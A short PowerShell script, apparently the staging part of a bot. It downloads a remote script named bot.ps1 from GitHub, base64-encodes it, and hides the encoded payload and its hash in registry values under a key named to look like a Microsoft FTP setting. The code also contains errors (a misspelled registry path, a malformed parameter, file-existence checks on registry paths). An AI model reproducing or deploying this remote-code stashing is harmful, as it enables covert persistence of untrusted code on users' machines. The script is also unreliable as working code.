$wget = Invoke-WebRequest -Uri "https://raw.githubusercontent.com/Theoooooo/script-powershell/master/bot.ps1" -UseBasicParsing
$wget.Content
$Bytes = [System.Text.Encoding]::Unicode.GetBytes($wget.Content)

$EncodedText =[Convert]::ToBase64String($Bytes)
$EncodedText

$sha256 = New-Object -TypeName System.Security.Cryptography.SHA256CryptoServiceProvider
$utf8 = New-Object -TypeName System.Text.UTF8Encoding
$hash = [System.BitConverter]::ToString($sha256.ComputeHash($utf8.GetBytes($EncodedText)))

if ([System.IO.File]::Exists("REGISTRY::HKEY_CURRENT_USER\Softwre\Microsoft\FTP\Task")) {
    New-ItemProperty -Path REGISTRY::HKEY_CURRENT_USER\Software\Microsoft\FTP -Name New_Value -PropertyTypeString -value $hash
} else {
    Set-ItemProperty -Path REGISTRY::HKEY_CURRENT_USER\Software\Microsoft\FTP -Name New_Value -Value $hash
}

$new_hash = Get-ItemPropertyValue -Path REGISTRY::HKEY_CURRENT_USER\Software\Microsoft\FTP -Name New_Value

if (-Not [System.IO.File]::Exists("REGISTRY::HKEY_CURRENT_USER\Softwre\Microsoft\FTP\Old_Value")) {
    New-ItemProperty -Path REGISTRY::HKEY_CURRENT_USER\Software\Microsoft\FTP -Name Old_Value -PropertyTypeString -value $new_hash
} else {
    $old_hash = Get-ItemPropertyValue -Path REGISTRY::HKEY_CURRENT_USER\Software\Microsoft\FTP -Name Old_Value
    if ($new_hash -eq $old_hash) {
        
    } else {
        if ([System.IO.File]::Exists("REGISTRY::HKEY_CURRENT_USER\Softwre\Microsoft\FTP\Task")) {
            New-ItemProperty -Path REGISTRY::HKEY_CURRENT_USER\Software\Microsoft\FTP -Name Task -PropertyType String -Value $EncodedText
        } else {
            Set-ItemProperty -Path REGISTRY::HKEY_CURRENT_USER\Software\Microsoft\FTP -Name Task -Value $EncodedText
        }
    }
}
